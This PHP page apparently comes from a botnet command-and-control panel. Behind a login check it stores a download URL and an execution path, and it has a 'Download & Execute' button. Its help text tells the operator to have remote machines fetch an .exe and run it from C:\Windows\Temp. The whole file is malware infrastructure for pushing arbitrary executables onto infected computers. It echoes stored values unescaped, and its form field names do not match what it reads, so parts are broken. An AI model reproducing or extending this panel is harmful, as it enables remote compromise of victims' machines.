<?php
@session_start(); if ( !isset($_SESSION['login']) ){ exit() ; }
require_once('../Class/class.base.de.datos.php');
require_once('../Configs/Configs.php');
	
if( isset($_POST['texto']) && !empty($_POST['texto']) ){
	$Datos = array ('http' => $_POST['texto'] );
	$UpdateBuscar = array('id' => 1) ;
	$Result = $DB->Update('http' , false , $Datos , $UpdateBuscar) ;
}

$http = $DB->Select("SELECT * FROM http");

?>

<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<body background="archivos/imagen/bg.gif">
<form method="POST" action="">
<div align="center">
<table style="border:1px solid #000000; border-collapse:collapse" width="726" bgColor="#808080" border="0" height="104">
<tr>
<td style="BORDER-RIGHT: #666666 1px solid; BORDER-TOP: #666666 1px solid; BORDER-LEFT: #666666 1px solid; BORDER-BOTTOM: #666666 1px solid; BACKGROUND-COLOR: #cccccc" align="middle" width="95%" background="archivos/imagen/bg.gif">
<p>
<img border="0" src="archivos/imagen/4_192.jpg" width="283" height="24" style="border: 1px solid #FFFFFF" align="left"><br>
<div id='mensajebot' name='mensajebot' align='center' style="color:#FF0000"></div><br>
</p>
<table width="99%" height="83" background="archivos/imagen/fondo.png" style="border-style:solid; border-width:1px; ">
  <tr>
    <td width='29%' align='left' bgcolor="#333333" height="19"><font face="Verdana" size="1" color="#FFFFFF">Download url:</font></td>
    <td align='left' width="68%" bgcolor="#333333" height="19"><div> <font size="1" face="Verdana">
      <input name="https" id="https" style="border:1px solid #FFFFFF; width: 394; font-family:Verdana; font-size:8pt; color:#666666; background-color:#000000; float:left; height:17" value="<?php echo $http[0]['http'] ; ?>" size="1" />
    </font> </span> </div></td>
  </tr>
  <tr>
    <td width='29%' align='left' bgcolor="#333333"><font face="Verdana" size="1" color="#FFFFFF">Run:</font></td>
    <td align='left' width="68%" bgcolor="#333333"><div> <span style="margin-left:0px" name="div_1_mensaje" id="div_1_mensaje"> <font size="1" face="Verdana">
      <input name="ExecuteHttp" id="ExecuteHttp" style="border:1px solid #FFFFFF; width: 396; color:#666666; font-family:Verdana; font-size:8pt; background-color:#000000; float:left; height:17" value="<?php echo $http[0]['Execute'] ; ?>" size="1" />
    </font> </span> </div></td>
  </tr>
  <tr>
    <td width='29%' align='left' height="35">&nbsp;</td>
    <td align='left' width="68%" height="35"><div> <font size="1" face="Verdana"> &nbsp;</font></span></div>
        <font size="1" face="Verdana"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
          &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </font></td>
  </tr>
</table>
<p><font face="Tahoma" color="#666666" size="1">Execute files in the folder: C:\Windows\Temp\TuFile.exe<br>
Download file from the url : http://www.google.com.mx/TuFile.exe</font><br>
<br>
    <input type="button" value="Donwload &amp; Execute" name="enviar" onclick='submitExecute();' style="font-family: Tahoma; font-size: 8pt; border: 1px solid #FFFFFF; ; color:#666666; background-color:#000000">
</td>
</tr>
</table>
</div>
</form>
</body>
</html>
